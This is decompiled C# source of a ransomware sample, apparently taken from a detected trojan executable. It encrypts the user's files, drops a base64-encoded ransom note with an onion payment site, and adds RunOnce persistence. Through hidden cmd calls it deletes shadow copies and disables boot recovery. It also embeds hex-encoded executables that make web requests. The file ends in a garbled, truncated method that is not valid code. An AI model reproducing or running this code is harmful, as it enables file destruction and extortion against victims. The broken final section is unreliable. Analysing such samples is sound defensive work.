// Decompiled with JetBrains decompiler
// Type: Ransimware.Ransimware
// Assembly: Ransimware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A501A711-5189-4BE9-8644-3BB447A057DB
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Encoder.gen-b8a3da8c60459974767732321a29b91dfea59ab5ad993caf832f2bb2484b5c96.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Ransimware
{
  public class Ransimware
  {
    private CspParameters cspp = new CspParameters();
    private RSACryptoServiceProvider rsa;
    private const string keyName = "4agrfsh5tx7";
    private const string ransomNote = "LS0tPT09IFdlbGNvbWUuIEFnYWluLiA9PT0tLS0NCg0KWytdIFdoYXRzIEhhcHBlbj8gWytdDQoNCllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCwgYW5kIGN1cnJlbnRseSB1bmF2YWlsYWJsZS4gWW91IGNhbiBjaGVjayBpdDogYWxsIGZpbGVzIG9uIHlvdSBjb21wdXRlciBoYXMgZXhwYW5zaW9uIHtFWFR9Lg0KQnkgdGhlIHdheSwgZXZlcnl0aGluZyBpcyBwb3NzaWJsZSB0byByZWNvdmVyIChyZXN0b3JlKSwgYnV0IHlvdSBuZWVkIHRvIGZvbGxvdyBvdXIgaW5zdHJ1Y3Rpb25zLiBPdGhlcndpc2UsIHlvdSBjYW50IHJldHVybiB5b3VyIGRhdGEgKE5FVkVSKS4NCg0KWytdIFdoYXQgZ3VhcmFudGVlcz8gWytdDQoNCkl0cyBqdXN0IGEgYnVzaW5lc3MuIFdlIGFic29sdXRlbHkgZG8gbm90IGNhcmUgYWJvdXQgeW91IGFuZCB5b3VyIGRlYWxzLCBleGNlcHQgZ2V0dGluZyBiZW5lZml0cy4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcyAtIG5vYm9keSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCB1cy4gSXRzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLg0KVG8gY2hlY2sgdGhlIGFiaWxpdHkgb2YgcmV0dXJuaW5nIGZpbGVzLCBZb3Ugc2hvdWxkIGdvIHRvIG91ciB3ZWJzaXRlLiBUaGVyZSB5b3UgY2FuIGRlY3J5cHQgb25lIGZpbGUgZm9yIGZyZWUuIFRoYXQgaXMgb3VyIGd1YXJhbnRlZS4NCklmIHlvdSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCBvdXIgc2VydmljZSAtIGZvciB1cywgaXRzIGRvZXMgbm90IG1hdHRlci4gQnV0IHlvdSB3aWxsIGxvc2UgeW91ciB0aW1lIGFuZCBkYXRhLCBjYXVzZSBqdXN0IHdlIGhhdmUgdGhlIHByaXZhdGUga2V5LiBJbiBwcmFjdGlzZSAtIHRpbWUgaXMgbXVjaCBtb3JlIHZhbHVhYmxlIHRoYW4gbW9uZXkuDQoNClsrXSBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyBbK10NCg0KWW91IGhhdmUgdHdvIHdheXM6DQoNCjEpIFtSZWNvbW1lbmRlZF0gVXNpbmcgYSBUT1IgYnJvd3NlciENCiAgYSkgRG93bmxvYWQgYW5kIGluc3RhbGwgVE9SIGJyb3dzZXIgZnJvbSB0aGlzIHNpdGU6IGh0dHBzOi8vdG9ycHJvamVjdC5vcmcvDQogIGIpIE9wZW4gb3VyIHdlYnNpdGU6IGh0dHA6Ly93d3lsZ2N2ZWdwMzN0Mnl0bnNxYTZrbHJvcTNrejY0M3E1Y2VpbmtxYjd4NjIzMmczZ3VpdDJpZC5vbmlvbg0KDQoyKSBJZiBUT1IgYmxvY2tlZCBpbiB5b3VyIGNvdW50cnksIHRyeSB0byB1c2UgVlBOISBCdXQgeW91IGNhbiB1c2Ugb3VyIHNlY29uZGFyeSB3ZWJzaXRlLiBGb3IgdGhpczoNCiAgYSkgT3BlbiB5b3VyIGFueSBicm93c2VyIChDaHJvbWUsIEZpcmVmb3gsIE9wZXJhLCBJRSwgRWRnZSkNCiAgYikgT3BlbiBvdXIgc2Vjb25kYXJ5IHdlYnNpdGU6IGh0dHA6Ly9kZWNyeXB0b3IudG9wLzkxM0FFRDBCNUZFMTQ5N0QNCg0KV2FybmluZzogc2Vjb25kYXJ5IHdlYnNpdGUgY2FuIGJlIGJsb2NrZWQsIHRoYXRzIHdoeSBmaXJzdCB2YXJpYW50IG11Y2ggYmV0dGVyIGFuZCBtb3JlIGF2YWlsYWJsZS4NCg0KV2hlbiB5b3Ugb3BlbiBvdXIgd2Vic2l0ZSwgcHV0IHRoZSBmb2xsb3dpbmcgZGF0YSBpbiB0aGUgaW5wdXQgZm9ybToNCktleToNCg0Ke0tFWX0NCg0KRXh0ZW5zaW9uIG5hbWU6DQoNCntFWFR9DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiEhISBEQU5HRVIgISEhDQpET05UIHRyeSB0byBjaGFuZ2UgZmlsZXMgYnkgeW91cnNlbGYsIERPTlQgdXNlIGFueSB0aGlyZCBwYXJ0eSBzb2Z0d2FyZSBmb3IgcmVzdG9yaW5nIHlvdXIgZGF0YSBvciBhbnRpdmlydXMgc29sdXRpb25zIC0gaXRzIG1heSBlbnRhaWwgZGFtZ2Ugb2YgdGhlIHByaXZhdGUga2V5IGFuZCwgYXMgcmVzdWx0LCBUaGUgTG9zcyBhbGwgZGF0YS4NCiEhISAhISEgISEhDQpPTkUgTU9SRSBUSU1FOiBJdHMgaW4geW91ciBpbnRlcmVzdHMgdG8gZ2V0IHlvdXIgZmlsZXMgYmFjay4gRnJvbSBvdXIgc2lkZSwgd2UgKHRoZSBiZXN0IHNwZWNpYWxpc3RzKSBtYWtlIGV2ZXJ5dGhpbmcgZm9yIHJlc3RvcmluZywgYnV0IHBsZWFzZSBzaG91bGQgbm90IGludGVyZmVyZS4NCiEhISAhISEgISEh";
    private const string getRelayHex = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    private static string username = Environment.UserName;
    private const string fileExt = "4agrfsh5tx7";
    private static string ransomFileName = "4agrfsh5tx7-HOW-TO-DECRYPT.txt";
    private const string getRelayFileName = "net.exe";
    private string SrcFolder = "C:\\Users\\" + Ransimware.Ransimware.username + "\\Documents\\";
    private string ransomNoteDropPath = "C:\\Users\\" + Ransimware.Ransimware.username + "\\Desktop\\" + Ransimware.Ransimware.ransomFileName;
    private string imgDestPath = "C:\\Users\\" + Ransimware.Ransimware.username + "\\AppData\\Local\\Temp\\xddsdf.bmp";

    public void Simulate()
    {
      this.CreateAsmKeys();
      this.GetPrivateKey();
      this.Encrypt();
      this.AddRegistryKeys();
      this.SetBackgroundImage();
      this.DropRansomNote();
      this.RunCommand("netsh advfirewall firewall set rule group==”Network Discovery” new enable=Yes”");
      this.RunCommand("/C vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures");
      Console.ReadLine();
    }

    public void AddRegistryKeys()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
      registryKey.SetValue("a8hadofi", (object) ("C: \\Users\\" + Ransimware.Ransimware.username + "\\AppData\\Local\\Temp\\" + AppDomain.CurrentDomain.FriendlyName));
      registryKey.Close();
      RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\WOW6432Node\\BlackLivesMatter", true);
      subKey.OpenSubKey("SOFTWARE\\WOW6432Node\\BlackLivesMatter", true);
      subKey.SetValue("96Ia6", (object) Encoding.ASCII.GetBytes("q9c!t8znqpf8#"));
      subKey.SetValue("Ed7", (object) Encoding.ASCII.GetBytes("revilransomware"));
      subKey.SetValue("JmfOBvhb", (object) Encoding.ASCII.GetBytes("helloworld"));
      subKey.SetValue("QIeQ", (object) Encoding.ASCII.GetBytes("infected"));
      subKey.SetValue("Ucr1RB", (object) Encoding.ASCII.GetBytes("youhavebeenpwnd"));
      subKey.SetValue("wJWsTYE", (object) ".4agrfsh5tx7");
      subKey.Close();
      Console.WriteLine("Registry keys added");
    }

    public void RunCommand(string command)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "cmd.exe",
        Arguments = command
      };
      try
      {
        process.Start();
        Console.WriteLine("Executed command " + command);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
    }

    private void CreateAsmKeys()
    {
      this.cspp.KeyContainerName = "4agrfsh5tx7";
      this.rsa = new RSACryptoServiceProvider(this.cspp);
      this.rsa.PersistKeyInCsp = false;
      if (this.rsa.PublicOnly)
        Console.WriteLine("Key: " + this.cspp.KeyContainerName + " - Public Only");
      else
        Console.WriteLine("Key: " + this.cspp.KeyContainerName + " - Full Key Pair");
    }

    private void GetPrivateKey()
    {
      this.cspp.KeyContainerName = "4agrfsh5tx7";
      this.rsa = new RSACryptoServiceProvider(this.cspp);
      this.rsa.PersistKeyInCsp = true;
      if (this.rsa.PublicOnly)
        Console.WriteLine("Key: " + this.cspp.KeyContainerName + " - Public Only");
      else
        Console.WriteLine("Key: " + this.cspp.KeyContainerName + " - Full Key Pair");
    }

    public void sendGetRequest(string url, int n)
    {
      byte[] numArray = new byte["4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E080500